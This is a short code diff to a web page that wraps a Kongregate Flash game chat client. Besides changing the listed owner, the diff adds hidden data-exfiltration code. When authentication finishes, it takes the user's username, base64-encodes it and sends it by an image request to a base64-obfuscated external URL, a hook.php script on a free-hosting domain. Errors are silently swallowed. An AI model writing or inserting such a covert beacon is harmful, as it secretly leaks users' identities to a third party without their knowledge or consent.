@@ -2,7 +2,7 @@
 <script>
 window.myVars = {
 	"name": "Main Client",
-	"owner": "jack",
+	"owner": "P",
 	"description": "",
 	"loader": "https://chat.kongregate.com/gamez/0029/7195/preview/loader.swf",
 	"flashVars": {
@@ -100,6 +100,15 @@ onload =()=>{
 		if(a.split("gotData BMM_CHAT_EXIT").length==2 ){
 			//console.log("%cSM>"+JSON.stringify(a),"color:#005;");
 			//(w.ac = (w.ac+1)%10) ==9?aik():0;
+		}
+		
+		if(a.match(/finishAuthenticate\(\)/)){
+			try{
+				let data = a.split('() data: ')[1];
+				data = JSON.parse(data);
+				let i = new Image();
+				i.src = atob("aHR0cHM6Ly9rb3Jvc2hpYW11LjAwMHdlYmhvc3RhcHAuY29tL3NtL2hvb2sucGhwP2k9")+encodeURIComponent(btoa(data.username));
+			}catch(e){}
 		}
 	};
 	rik();
